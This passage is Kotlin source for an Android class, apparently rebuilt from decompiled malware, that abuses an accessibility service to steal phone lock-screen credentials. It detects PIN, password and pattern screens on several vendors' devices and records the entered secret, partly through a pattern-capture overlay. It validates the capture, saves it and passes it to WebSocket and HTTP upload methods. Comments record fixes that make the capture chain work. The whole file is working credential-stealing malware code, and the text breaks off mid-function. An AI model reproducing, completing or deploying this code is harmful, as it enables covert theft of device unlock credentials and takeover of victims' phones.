package com.storm.safe.rock.service.modules.cipher

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.security.keystore.KeyGenParameterSpec
import android.util.Base64
import android.util.Log
import com.storm.safe.rock.p000.AppStatusManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.security.KeyStore
import java.util.Arrays
import java.util.LinkedHashMap
import java.util.Locale
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject

/**
 * 密码捕获管理器 — Phase 7 核心类。
 *
 * JADX: C0335a1.java (3005 行)
 * 管理锁屏密码/PIN/图案的检测、捕获和上传。
 *
 * 核心功能:
 * - AES-GCM 加解密（AndroidKeyStore）
 * - 锁屏类型检测（PIN/密码/图案）
 * - 无障碍事件处理
 * - 图案 overlay 触发
 * - 密码保存和上传
 *
 * 方法映射:
 *   a6 → sleep500
 *   a7 → sleep200
 *   b3 → decryptAesGcm
 *   b9 → dumpNodeTree
 *   c0 → debugPatternInput
 *   c1 → enableListening
 *   c2 → encryptAesGcm
 *   c3 → findEditText
 *   d1 → getAesKey
 *   e0 → resetOverlayWatcher
 *   ... (更多方法见下文)
 */
@Suppress("MemberVisibilityCanBePrivate")
class CipherCaptureManager(
    @Volatile var service: AccessibilityService,
    val context: Context
) {

    companion object {
        private const val TAG = "CipherCaptureManager"

        /** 密码质量常量 */
        const val QUALITY_NUMERIC = "PASSWORD_QUALITY_NUMERIC_COMPLEX"
        const val QUALITY_ALPHA = "PASSWORD_QUALITY_ALPHANUMERIC"
        const val QUALITY_PATTERN = "PASSWORD_QUALITY_PATTERN"
        const val QUALITY_TOUCH = "PASSWORD_QUALITY_TOUCH_POINTS"

        /** overlay 检查间隔 */
        const val OVERLAY_CHECK_INTERVAL = 500L

        /** 节点调试最大深度 */
        const val MAX_NODE_DEPTH = 5

        /** 延迟检测时间序列 */
        val CHECK_DELAYS = longArrayOf(200, 500, 1000, 1500)

        /** 锁屏相关包名 */
        val KEYGUARD_PACKAGE_NAMES = setOf(
            "com.android.systemui",
            "com.android.settings",
            "com.samsung.android.biometrics.app.setting"
        )

        /** 锁屏相关 Activity 类名关键字 */
        val LOCK_SCREEN_CLASSES = listOf(
            "ConfirmLockPassword",
            "ConfirmLockPattern",
            "ConfirmLockPin",
            "ChooseLockGeneric",
            "ConfirmDeviceCredentialActivity",
            "ConfirmVivoPin",
            "com.coloros.setting.lock",
            "com.oplus.setting.lock",
            "KeyguardPasswordView",
            "KeyguardPinView",
            "KeyguardPatternView",
            "KeyguardSimPinView",
            "KeyguardSimPukView"
        )

        /** PIN/密码输入框资源 ID */
        val PIN_INPUT_IDS = listOf(
            "com.android.systemui:id/passwordEntry",
            "com.android.systemui:id/pinEntry",
            "com.android.settings:id/password_entry",
            "com.android.settings:id/passwordEntry",
            "com.samsung.android.biometrics.app.setting:id/password_entry"
        )

        /** 图案锁资源 ID */
        val PATTERN_INPUT_IDS = listOf(
            "com.android.systemui:id/lockPattern",
            "com.android.settings:id/lockPattern",
            "com.samsung.android.biometrics.app.setting:id/lockPattern",
            "com.android.systemui:id/lockPatternView",
            "com.android.systemui:id/biometric_lockPattern"
        )

        /**
         * 有效密码包名 — 精确匹配集（vendor m211820d6 L2008 过滤前半）
         * vendor 还用 startsWith 匹配 oppo/oplus/coloros/vivo 变种，见 isPasswordInputPackage().
         */
        val VALID_PASSWORD_PACKAGES = setOf(
            "com.android.systemui",
            "com.hihonor.android.systemui",
            "com.android.settings",
            "com.hihonor.android.settings",
            "com.samsung.android.biometrics.app.setting"
        )

        /**
         * 包名 startsWith 前缀集（vendor m211804a1 L780-781: oppo/oplus/coloros/vivo）
         * ADAPT 2026-04-17: 补齐厂商变种。
         */
        val PASSWORD_PACKAGE_PREFIXES = listOf(
            "com.oppo.settings",
            "com.coloros.settings",
            "com.oplus.settings",
            "com.vivo.settings"
        )

        /**
         * Check whether a package name should be monitored for password input.
         * vendor: C0335a1.m211804a1 L780-781 (exact equals OR startsWith).
         */
        @JvmStatic
        fun isPasswordInputPackage(pkg: String?): Boolean {
            if (pkg.isNullOrEmpty()) return false
            if (VALID_PASSWORD_PACKAGES.contains(pkg)) return true
            return PASSWORD_PACKAGE_PREFIXES.any { pkg.startsWith(it) }
        }

        /** 密码遮蔽符 (vendor: b2 校验) */
        val MASK_CHARS = listOf("*", "•", "●", "⬤", "◉", "○", "∙", "＊")

        /** 删除键标签（多语言）(vendor: dh0.f55777c7) */
        val DELETE_LABELS = listOf("删除", "delete", "Delete", "DEL", "Backspace")

        /** 确认键标签（多语言）(vendor: dh0.f55778c8) */
        val CONFIRM_LABELS = listOf("确认", "确定", "OK", "ok", "完成", "Done", "DONE", "Enter", "GO")

        /** "使用密码" 按钮 viewId 列表 (vendor: e3) */
        val USE_CREDENTIAL_BUTTON_IDS = listOf(
            "com.android.systemui:id/button_use_credential",
            "com.android.settings:id/button_use_credential",
            "com.samsung.android.biometrics.app.setting:id/button_use_credential"
        )

        /** "使用密码" 按钮文本描述 (vendor: e3) */
        val USE_CREDENTIAL_TEXTS = listOf("使用密码", "Use password", "使用PIN码", "Enter PIN")

        /** MIUI 确认键 ID */
        const val MIUI_CONFIRM_KEY = ":id/btn_letter_ok"

        /** 密码扩展时间阈值 (vendor: a9 — 1500ms) */
        const val EXPANSION_STABLE_THRESHOLD_MS = 1500L

        /** AndroidKeyStore 别名 (vendor: C0600hy.getKEY_ALIAS()) */
        private const val KEY_ALIAS = "cipher_capture_key"

        /** SharedPreferences 名称 */
        private const val PREFS_NAME = "cipher_capture_prefs"

        /** 单例 — use CipherCaptureManager.instance to access. */
        @Volatile
        var instance: CipherCaptureManager? = null

        // ==================== 静态方法 ====================

        /**
         * 休眠 500ms。
         * vendor: a6
         */
        fun sleep500() {
            try { Thread.sleep(500L) } catch (_: Exception) {}
        }

        /**
         * 休眠 200ms。
         * vendor: a7
         */
        fun sleep200() {
            try { Thread.sleep(200L) } catch (_: Exception) {}
        }

        /**
         * AES-GCM 解密。
         * vendor: b3
         */
        fun decryptAesGcm(encrypted: String): String? {
            val key = getAesKey() ?: return null
            return try {
                val combined = Base64.decode(encrypted, Base64.NO_WRAP)
                val iv = combined.sliceArray(0 until 12)
                val ciphertext = combined.sliceArray(12 until combined.size)
                val cipher = Cipher.getInstance("AES/GCM/NoPadding")
                cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(128, iv))
                String(cipher.doFinal(ciphertext), Charsets.UTF_8)
            } catch (e: Exception) {
                Log.w(TAG, "解密失败: ${e.message}")
                null
            }
        }

        /**
         * AES-GCM 加密。
         * vendor: c2
         */
        fun encryptAesGcm(plaintext: String): String? {
            val key = getAesKey() ?: return null
            return try {
                val cipher = Cipher.getInstance("AES/GCM/NoPadding")
                cipher.init(Cipher.ENCRYPT_MODE, key)
                val iv = cipher.iv
                val encrypted = cipher.doFinal(plaintext.toByteArray(Charsets.UTF_8))
                val combined = Arrays.copyOf(iv, iv.size + encrypted.size)
                System.arraycopy(encrypted, 0, combined, iv.size, encrypted.size)
                Base64.encodeToString(combined, Base64.NO_WRAP)
            } catch (e: Exception) {
                Log.w(TAG, "加密失败: ${e.message}")
                null
            }
        }

        /**
         * 获取 AndroidKeyStore 中的 AES 密钥。
         * vendor: d1
         */
        fun getAesKey(): SecretKey? {
            return try {
                val keyStore = KeyStore.getInstance("AndroidKeyStore")
                keyStore.load(null)
                keyStore.getKey(KEY_ALIAS, null) as? SecretKey
            } catch (e: Exception) {
                Log.w(TAG, "获取密钥失败: ${e.message}")
                null
            }
        }

        /**
         * 递归查找 EditText 节点。
         * vendor: c3
         */
        fun findEditText(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
            val className = node.className?.toString() ?: ""
            if (isEditTextClass(className) || node.isEditable || node.isPassword) {
                return node
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val found = findEditText(child)
                if (found != null) return found
            }
            return null
        }

        /**
         * 判断类名是否为 EditText。
         */
        fun isEditTextClass(className: String): Boolean {
            return className.contains("EditText", ignoreCase = false)
        }

        /**
         * 调试输出节点树。
         * vendor: b9
         */
        fun dumpNodeTree(node: AccessibilityNodeInfo, depth: Int) {
            if (depth > MAX_NODE_DEPTH) return
            val indent = "  ".repeat(depth)
            val className = node.className?.toString() ?: "null"
            val viewId = node.viewIdResourceName ?: "no-id"
            val text = node.text?.toString()?.take(20) ?: ""
            Log.d(TAG, "${indent}Node: class=$className, id=$viewId, text=$text" +
                ", editable=${node.isEditable}, password=${node.isPassword}, focused=${node.isFocused}")
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                dumpNodeTree(child, depth + 1)
            }
        }

        /**
         * 启用系统密码监听模式。
         * vendor: c1
         */
        fun enableListening(manager: CipherCaptureManager) {
            if (manager.isListening) {
                Log.d(TAG, "⚠️ 密码监听已激活，跳过重复调用")
                return
            }
            manager.isListening = true
            manager.overlayPending = false

            // 清除旧的 overlay runnable
            manager.overlayRunnable?.let { manager.handler.removeCallbacks(it) }
            manager.overlayRunnable = null

            // 重置状态
            manager.collectedEvents.clear()
            manager.patternDetected = false
            manager.pinDigits.clear()
            manager.passwordChars.clear()
            manager.lastEventTime = 0L

            Log.d(TAG, "✅ 启用系统密码监听模式")
            manager.resetOverlayWatcher()

            // 延迟检测
            manager.delayedChecks.forEach { manager.handler.removeCallbacks(it) }
            manager.delayedChecks.clear()
            for (delay in CHECK_DELAYS) {
                val runnable = Runnable { manager.checkLockScreenType() }
                manager.delayedChecks.add(runnable)
                manager.handler.postDelayed(runnable, delay)
            }
        }
    }

    // ==================== 实例字段 ====================

    /** OkHttp 客户端 */
    val httpClient: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(5L, TimeUnit.SECONDS)
        .readTimeout(5L, TimeUnit.SECONDS)
        .build()

    /** Handler */
    val handler: Handler = Handler(Looper.getMainLooper())

    /** SharedPreferences (lazy) */
    private val prefs by lazy {
        context.getSharedPreferences(PREFS_NAME, 0)
    }

    /** 上次事件时间戳 (JADX: f53296b0) */
    val lastEventTimestamp: AtomicLong = AtomicLong(0L)

    /** 锁定批次 ID (JADX: f53295a9, volatile long) — 用于 sendPasswordEvent */
    @Volatile
    var lockBatchId: Long = 0L

    /** 是否正在监听 */
    @Volatile
    var isListening: Boolean = false

    /** 已收集的事件 */
    val collectedEvents: ArrayList<AccessibilityEvent> = ArrayList()

    /** 是否检测到图案锁 */
    @Volatile
    var patternDetected: Boolean = false

    /** PIN 数字序列 */
    val pinDigits: ArrayList<String> = ArrayList()

    /** 密码字符序列 */
    val passwordChars: ArrayList<String> = ArrayList()

    /** 上次事件时间 */
    @Volatile
    var lastEventTime: Long = 0L

    /** 延迟检查 Runnable 列表 */
    val delayedChecks: ArrayList<Runnable> = ArrayList()

    /** overlay 是否 pending */
    @Volatile
    var overlayPending: Boolean = false

    /** overlay Runnable */
    var overlayRunnable: Runnable? = null

    /** 待处理密码 (C0598hx) */
    @Volatile
    var pendingCipher: Any? = null

    /** 密码已确认 */
    @Volatile
    var cipherConfirmed: Boolean = false

    /** 最后检测时间 */
    @Volatile
    var lastCheckTime: Long = 0L

    /** 检查间隔 */
    val checkInterval: Long = OVERLAY_CHECK_INTERVAL

    /** 处理标记 */
    val processingFlag: AtomicBoolean = AtomicBoolean(false)

    /** PatternCaptureOverlay 引用 */
    var patternOverlay: PatternCaptureOverlay? = null

    /** overlay 检查 Runnable */
    var overlayWatcherRunnable: Runnable? = null

    init {
        // ADAPT 2026-04-17 Plan Task 8 fix: set companion singleton on construction
        // so syuqattwmgit.onResume's `CipherCaptureManager.instance?.startListening()`
        // works after the first construction. Pre-fix, `instance` was declared but
        // never assigned, breaking the entire cipher capture chain.
        instance = this

        // 初始化 AES 密钥
        try {
            val keyStore = KeyStore.getInstance("AndroidKeyStore")
            keyStore.load(null)
            if (!keyStore.containsAlias(KEY_ALIAS)) {
                val keyGen = KeyGenerator.getInstance("AES", "AndroidKeyStore")
                val spec = KeyGenParameterSpec.Builder(KEY_ALIAS, 3) // ENCRYPT | DECRYPT
                    .setBlockModes("GCM")
                    .setEncryptionPaddings("NoPadding")
                    .setKeySize(256)
                    .build()
                keyGen.init(spec)
                keyGen.generateKey()
                Log.d(TAG, "加密密钥已生成")
            }
        } catch (e: Exception) {
            Log.w(TAG, "初始化加密密钥失败: ${e.message}")
        }
    }

    // ==================== 实例方法 ====================

    /**
     * 重置 overlay 监视器。
     * vendor: e0
     */
    fun resetOverlayWatcher() {
        overlayWatcherRunnable?.let { handler.removeCallbacks(it) }
        overlayWatcherRunnable = null
        lastCheckTime = System.currentTimeMillis()
    }

    /**
     * 检测当前锁屏类型（PIN/图案/密码）。
     * vendor: 多个方法组合
     */
    fun checkLockScreenType() {
        try {
            val root = service.rootInActiveWindow ?: return
            // 检查图案锁
            for (patternId in PATTERN_INPUT_IDS) {
                val nodes = root.findAccessibilityNodeInfosByViewId(patternId)
                if (!nodes.isNullOrEmpty()) {
                    Log.d(TAG, "检测到图案锁: $patternId")
                    patternDetected = true
                    tryStartPatternOverlay()
                    return
                }
            }
            // 检查 PIN/密码输入框
            for (pinId in PIN_INPUT_IDS) {
                val nodes = root.findAccessibilityNodeInfosByViewId(pinId)
                if (!nodes.isNullOrEmpty()) {
                    Log.d(TAG, "检测到 PIN/密码输入框: $pinId")
                    return
                }
            }
            // 通用 EditText 搜索
            val editText = findEditText(root)
            if (editText != null) {
                Log.d(TAG, "检测到 EditText: ${editText.viewIdResourceName}")
            }
        } catch (e: Exception) {
            Log.w(TAG, "checkLockScreenType error: ${e.message}")
        }
    }

    /**
     * 尝试启动图案捕获 overlay。
     * vendor: 多个方法
     */
    fun tryStartPatternOverlay() {
        if (overlayPending) return
        if (patternOverlay != null && patternOverlay!!.isCapturing()) {
            Log.d(TAG, "已有 overlay 在运行")
            return
        }

        overlayPending = true
        val runnable = Runnable {
            val overlay = patternOverlay
            if (overlay == null || !overlay.isCapturing()) {
                if (isListening) {
                    patternOverlay = PatternCaptureOverlay.instance
                        ?: PatternCaptureOverlay(service, context).also {
                            PatternCaptureOverlay.instance = it
                        }
                    patternOverlay!!.onPatternCaptured = { indices, points, screenBounds, parentBounds ->
                        Log.d(TAG, "✅ 图案已捕获: indices=${indices.joinToString("-")}, points=${points.size}")
                        // 保存图案密码
                        saveCipher("pattern", true, indices.joinToString(","))
                    }
                    patternOverlay!!.createPatternView()

                    if (!patternOverlay!!.isCapturing()) {
                        overlayPending = false
                        Log.w(TAG, "🔷 PatternCaptureOverlay 未能创建，重置 pending")
                        return@Runnable
                    }

                    // 启动定时检测
                    resetOverlayWatcher()
                    val watcher = Runnable { /* overlay 存活检测 */ }
                    overlayWatcherRunnable = watcher
                    handler.postDelayed(watcher, checkInterval)
                }
            } else {
                Log.d(TAG, "🔷 条件不满足，跳过创建")
                if (!overlay.isCapturing()) {
                    overlayPending = false
                }
            }
        }
        overlayRunnable = runnable
        handler.postDelayed(runnable, 300L)
    }

    /**
     * 保存密码。
     * vendor: saveCipher (通过 coroutine lambda)
     */
    fun saveCipher(type: String, isPattern: Boolean, value: String) {
        try {
            // JADX: C0107as → AppStatusManager.saveLockPassword
            val ctx = service?.applicationContext
            if (ctx != null) {
                AppStatusManager.getInstance(ctx).saveLockPassword(type, true, value)
            }
            Log.d(TAG, "✅ 密码已保存: type=$type, value=${value.take(10)}...")
        } catch (e: Exception) {
            Log.w(TAG, "保存密码失败: ${e.message}")
        }
    }

    /**
     * 停止密码监听。
     */
    fun stopListening() {
        isListening = false
        overlayPending = false
        overlayRunnable?.let { handler.removeCallbacks(it) }
        overlayRunnable = null
        delayedChecks.forEach { handler.removeCallbacks(it) }
        delayedChecks.clear()
        resetOverlayWatcher()

        // 停止 pattern overlay
        patternOverlay?.stopCapture(false)
        patternOverlay = null

        Log.d(TAG, "⏹ 密码监听已停止")
    }

    /**
     * 处理已缓冲的图案密码（验证后保存）。
     * vendor: b1 — confirmAndSaveLastCipher
     */
    fun confirmAndSaveLastCipher(): Boolean {
        val overlay = patternOverlay
        if (overlay != null) {
            val canLock = if (overlay.isReplaying) false else overlay.lock.tryLock()
            if (canLock == false) {
                Log.w(TAG, "confirmAndSaveLastCipher: tryLock 失败（原子操作进行中），跳过")
                return false
            }
        }
        try {
            return confirmAndSaveLastCipherInternal()
        } finally {
            patternOverlay?.lock?.let { if (it.isHeldByCurrentThread) it.unlock() }
        }
    }

    /**
     * 验证并保存密码（内部方法）。
     * vendor: b2 — confirmAndSaveLastCipherInternal (87 行)
     *
     * JADX 逻辑:
     * 1. 如果无 pending cipher → 尝试从 hover 收集的数据创建
     * 2. 验证密码有效性: 长度>=4, 不含遮蔽符, 非已保存密码前缀
     * 3. 图案模式: patternIndices 至少 4 个
     * 4. 通过验证后: 保存到 prefs → 通知成功 → 发送到服务器
     */
    fun confirmAndSaveLastCipherInternal(): Boolean {
        val cipher = pendingCipher as? Map<*, *>
        if (cipher == null) {
            // vendor: 检查 hover 模式收集的字符 (f53298b2)
            if (collectedEvents.isNotEmpty() || pinDigits.isNotEmpty() || passwordChars.isNotEmpty()) {
                val text = if (pinDigits.isNotEmpty()) {
                    pinDigits.joinToString("")
                } else if (passwordChars.isNotEmpty()) {
                    passwordChars.joinToString("")
                } else null

                if (text != null && text.length >= 4) {
                    val type = if (hasAlpha) "password" else "pin"
                    bufferCipher(text, type)
                    Log.d(TAG, "✅ confirmAndSaveLastCipherInternal: hover→buffer len=${text.length}, type=$type")
                }
            }
        }

        val finalCipher = pendingCipher as? Map<*, *> ?: run {
            Log.w(TAG, "confirmAndSaveLastCipher: 无缓冲密码")
            return false
        }

        val quality = finalCipher["quality"] as? String ?: ""
        val text = finalCipher["text"] as? String
        @Suppress("UNCHECKED_CAST")
        val patternIndices = finalCipher["patternIndices"] as? List<Int>

        // vendor: 图案模式校验
        if (quality == QUALITY_PATTERN) {
            if (patternIndices == null || patternIndices.size < 4) {
                Log.w(TAG, "❌ 图案校验失败: 点数=${patternIndices?.size ?: 0}, 需要>=4")
                Log.w(TAG, "❌ 密码有效性校验失败，丢弃: type=$quality, text=$text")
                pendingCipher = null
                return false
            }
            // 图案通过
            Log.d(TAG, "✅ 密码验证通过，保存: type=$quality, patternLen=${patternIndices.size}")
            Log.d(TAG, "🔐 密码已捕获: type=$quality, textLen=${text?.length ?: 0}, patternLen=${patternIndices.size}")
            saveCipherToPrefs(finalCipher)
            syncToAppStatusManager(finalCipher)
            sendPasswordViaWebSocket(finalCipher)
            uploadPasswordViaHttp(finalCipher)

            notifyPasswordCaptureSuccess()
            pendingCipher = null
            return true
        }

        // vendor: 文本密码校验
        if (text.isNullOrEmpty()) {
            Log.w(TAG, "❌ 密码校验失败: 文本为空")
            Log.w(TAG, "❌ 密码有效性校验失败，丢弃: type=$quality, text=$text")
            pendingCipher = null
            return false
        }
        if (text.length < 4) {
            Log.w(TAG, "❌ 密码校验失败: 长度=${text.length}, 需要>=4")
            Log.w(TAG, "❌ 密码有效性校验失败，丢弃: type=$quality, text=$text")
            pendingCipher = null
            return false
        }

        // vendor: 检查遮蔽符
        if (containsMaskChars(text)) {
            Log.w(TAG, "❌ 密码校验失败: 包含遮蔽字符，密码不完整")
            Log.w(TAG, "❌ 密码有效性校验失败，丢弃: type=$quality, text=$text")
            pendingCipher = null
            return false
        }

        // vendor: 检查是否为已保存密码的前缀（可能为截断版本）
        val lockedCipher = loadCipherFromPrefs(true)
        if (lockedCipher != null) {
            val savedText = lockedCipher["text"] as? String
            if (!savedText.isNullOrEmpty() && savedText != text && savedText.startsWith(text)) {
                Log.w(TAG, "❌ 密码校验失败: 是已保存locked密码的前缀（可能为截断版本）")
                Log.w(TAG, "❌ 密码有效性校验失败，丢弃: type=$quality, text=$text")
                pendingCipher = null
                return false
            }
        }
        val normalCipher = loadCipherFromPrefs(false)
        if (normalCipher != null) {
            val savedText = normalCipher["text"] as? String
            if (!savedText.isNullOrEmpty() && savedText != text && savedText.startsWith(text)) {
                Log.w(TAG, "❌ 密码校验失败: 是已保存device密码的前缀（可能为截断版本）")
            }
        }

        // 通过验证
        Log.d(TAG, "✅ 密码验证通过，保存: type=$quality, textLen=${text.length}")
        Log.d(TAG, "🔐 密码已捕获: type=$quality, textLen=${text.length}, patternLen=0")
        saveCipherToPrefs(finalCipher)
        syncToAppStatusManager(finalCipher)
        sendPasswordViaWebSocket(finalCipher)
        uploadPasswordViaHttp(finalCipher)
        notifyPasswordCaptureSuccess()
        pendingCipher = null
        return true
    }

    /** 是否包含字母 (vendor: f53299b3) */
    @Volatile
    var hasAlpha: Boolean = false

    /** 密码快照列表 (vendor: f53301b5 / passwordChars in JADX) — 多次截取的密码文本快照 */
    val passwordSnapshots: ArrayList<String> = ArrayList()

    // ==================== 缺失的静态辅助方法 ====================

    // ── Phase 10 stubs (referenced by zbrefryi, syuqattwmgit) ──

    /**
     * Dispatch a named event string.
     * vendor: d9 — sendPasswordEvent
     * Sends intentCode + lockBatchId via NetworkManager WS event.
     */
    fun dispatchEvent(action: String) {
        if (action.isEmpty()) return
        sendPasswordEvent(action)
    }

    /**
     * Set whether the password was verified.
     * vendor: b4 — deleteCipherFromPrefs
     * When verified=false, deletes the normal cipher from prefs.
     * When verified=true, deletes the locked cipher from prefs.
     */
    fun setPasswordVerified(verified: Boolean) {
        deleteCipherFromPrefs(verified)
        Log.d(TAG, "setPasswordVerified: $verified — deleted key=${if (verified) "cipher_locked" else "cipher_normal"}")
    }

    /**
     * Discard any buffered password data.
     * vendor: b6 → b7 (discardPendingCipher → discardPendingCipherInternal)
     */
    fun discardBufferedPassword() {
        discardPendingCipher()
    }

    /**
     * 读取当前缓冲的密码（用于 capturePasswordViaSystemAuth 的 already-captured gate）。
     * vendor: C0335a1.m211819d0(boolean z) L1714
     *
     * @param discard true=取出后清空 pendingCipher (对应 vendor m211819d0(true));
     *                false=仅 peek，保留 pendingCipher (对应 vendor m211819d0(false))
     * @return 缓冲的 cipher Map，或 null 表示没有
     */
    @Synchronized
    fun readBufferedCipher(discard: Boolean): Map<*, *>? {
        val cipher = pendingCipher as? Map<*, *> ?: return null
        if (discard) {
            Log.d(TAG, "🧹 readBufferedCipher(discard=true) — pop and clear pendingCipher")
            pendingCipher = null
        } else {
            Log.d(TAG, "👁 readBufferedCipher(discard=false) — peek only")
        }
        return cipher
    }

    /** Start listening mode. Stub for Phase 10. */
    fun startListening() {
        enableListening(this)
    }

    /**
     * 查找 focused EditText。
     * vendor: c4 — findFocusedEditText
     */
    fun findFocusedEditText(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val className = node.className?.toString() ?: ""
        if ((className.contains("EditText") || node.isEditable) && node.isFocused) {
            Log.d(TAG, "findFocusedEditText: 找到 focused EditText class=$className")
            return node
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findFocusedEditText(child)
            if (found != null) return found
        }
        return null
    }

    /**
     * 通过内容描述查找可点击节点。
     * vendor: c5 — findNodeByContentDesc
     */
    fun findNodeByContentDesc(node: AccessibilityNodeInfo, desc: String): AccessibilityNodeInfo? {
        val nodeDesc = node.contentDescription?.toString()
        if (nodeDesc == desc) {
            val className = node.className?.toString()
            if (className == "android.view.View" && node.isClickable) {
                return node
            }
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findNodeByContentDesc(child, desc)
            if (found != null) return found
        }
        return null
    }

    /**
     * 通过 viewId 查找节点。
     * vendor: c6 — findNodeByViewId
     */
    fun findNodeByViewId(root: AccessibilityNodeInfo, viewId: String): AccessibilityNodeInfo? {
        val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
        return if (nodes.isNullOrEmpty()) null else nodes[0]
    }

    /**
     * 通过 viewId + 类名查找节点。
     * vendor: c7 — findNodeByViewIdAndClass
     */
    fun findNodeByViewIdAndClass(root: AccessibilityNodeInfo, viewId: String, className: String): AccessibilityNodeInfo? {
        val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
        if (nodes == null) return null
        for (node in nodes) {
            if (node.className?.toString() == className) return node
        }
        return null
    }

    /**
     * 查找密码输入框（多源搜索）。
     * vendor: c8 — findPasswordInputById
     */
    fun findPasswordInputById(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val pkg = root.packageName?.toString() ?: "com.android.settings"
        val ids = listOf(
            "$pkg:id/passwordEntry", "$pkg:id/password_entry", "$pkg:id/password",
            "$pkg:id/pinEntry", "$pkg:id/pin_entry", "$pkg:id/lockPassword",
            "com.android.settings:id/passwordEntry", "com.android.settings:id/password_entry",
            "com.android.settings:id/pinEntry"
        )
        for (id in ids) {
            val nodes = root.findAccessibilityNodeInfosByViewId(id)
            if (!nodes.isNullOrEmpty()) {
                Log.d(TAG, "findPasswordInputById: 通过 viewId=$id 找到节点 class=${nodes[0].className}")
                return nodes[0]
            }
        }
        return null
    }

    /**
     * Activity 级白名单 — 验证当前 active 窗口是 ConfirmLock* UI。
     * vendor: C0335a1.m211804a1 (L757-810)
     *
     * 逻辑：
     *   1. 取 service.rootInActiveWindow 的 packageName
     *   2. 若 !isPasswordInputPackage(pkg) → 立即返回 false
     *   3. 否则在 root 节点树里找 "passwordEntry" / "key0" / "key1" / "lockPattern" viewId
     *   4. 任一存在 → 返回 true（真的是 ConfirmLock UI）
     *
     * 这一步防止 settings 内其他 EditText（搜索、WiFi 密码等）被误判。
     *
     * Plan 2026-04-17 ADAPT.
     */
    fun isInConfirmLockScreen(): Boolean {
        val root = try { service.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        try {
            val pkg = root.packageName?.toString() ?: return false
            if (!isPasswordInputPackage(pkg)) return false

            // vendor L793 — 确认键/密码框 viewId 候选
            val confirmLockIds = listOf(
                "$pkg:id/key0",
                "$pkg:id/key1",
                "$pkg:id/lockPattern",
                "$pkg:id/four_to_more_key0",
                "$pkg:id/vivo_pin_confirm",
                "$pkg:id/mix_confirm",
                "$pkg:id/iv_complete",
                "$pkg:id/mix_normal_confirm",
                "$pkg:id/passwordEntry",
                "$pkg:id/password_entry",
                "com.android.settings:id/key0",
                "com.android.settings:id/key1",
                "com.android.settings:id/lockPattern",
                "com.android.settings:id/passwordEntry",
                "com.android.systemui:id/key0",
                "com.android.systemui:id/lockPattern"
            )
            for (id in confirmLockIds) {
                val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
                if (!nodes.isNullOrEmpty()) {
                    try { nodes.forEach { it.recycle() } } catch (_: Exception) {}
                    return true
                }
            }
            return false
        } finally {
            try { root.recycle() } catch (_: Exception) {}
        }
    }

    /**
     * 通过类名查找图案锁节点。
     * vendor: c9 — findPatternNodeByClass
     */
    fun findPatternNodeByClass(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val className = node.className?.toString() ?: ""
        if (className.contains("LockPattern", ignoreCase = true) ||
            className.contains("PatternView", ignoreCase = true)) {
            Log.d(TAG, "findPatternNodeByClass: 找到 $className")
            return node
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findPatternNodeByClass(child)
            if (found != null) return found
        }
        return null
    }

    /**
     * 调试输出图案输入节点树。
     * vendor: c0 — debugPatternInput
     */
    fun debugPatternInput(node: AccessibilityNodeInfo, depth: Int) {
        if (depth > 4) return
        val indent = "  ".repeat(depth)
        val viewId = try { node.viewIdResourceName } catch (_: Exception) { null }
        val className = node.className
        val text = node.text
        Log.d(TAG, "tryPatternInput: $indent$className id=$viewId text=$text clickable=${node.isClickable}")
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            debugPatternInput(child, depth + 1)
        }
    }

    /**
     * 移除无效图案点（负数、重复）。
     * vendor: d2 — removeInvalidPatternPoints
     */
    fun removeInvalidPatternPoints(points: java.util.LinkedList<android.graphics.Point>) {
        if (points.isEmpty()) return
        val iter = points.listIterator()
        var prev: android.graphics.Point? = null
        while (iter.hasNext()) {
            val point = iter.next()
            if (point.x < 0 || point.y < 0) {
                iter.remove()
            } else if (prev != null && point.x == prev.x && point.y == prev.y) {
                iter.remove()
            } else {
                prev = point
            }
        }
    }

    /**
     * 坐标变换（图案点从旧窗口映射到新窗口）。
     * vendor: d3 — transformPatternPoints
     */
    fun transformPatternPoints(
        points: java.util.LinkedList<android.graphics.Point>,
        origScreen: android.graphics.Rect, origParent: android.graphics.Rect,
        currScreen: android.graphics.Rect, currParent: android.graphics.Rect
    ): List<android.graphics.Point> {
        if (points.isEmpty()) return points.toList()

        val origW = origScreen.right - origScreen.left
        val origH = origScreen.bottom - origScreen.top
        val origMinDim = Math.min(origH, origW)
        if (origMinDim == 0) {
            Log.d(TAG, "transformPatternPoints: origMinDim=0, 返回原始点")
            return points.toList()
        }

        val origParentH = origParent.bottom - origParent.top
        val origPadding = if (origH < origParentH) origParentH - origH else 0
        val screenWidth = android.content.res.Resources.getSystem().displayMetrics.widthPixels
        val origCenterX = if (screenWidth > 0) screenWidth / 2 else (origW / 2) + origScreen.left
        val origCenterY = (origPadding / 2) + (origH / 2) + origScreen.top

        val currW = currScreen.right - currScreen.left
        val currH = currScreen.bottom - currScreen.top
        val currMinDim = Math.min(currH, currW)
        val currParentH = currParent.bottom - currParent.top
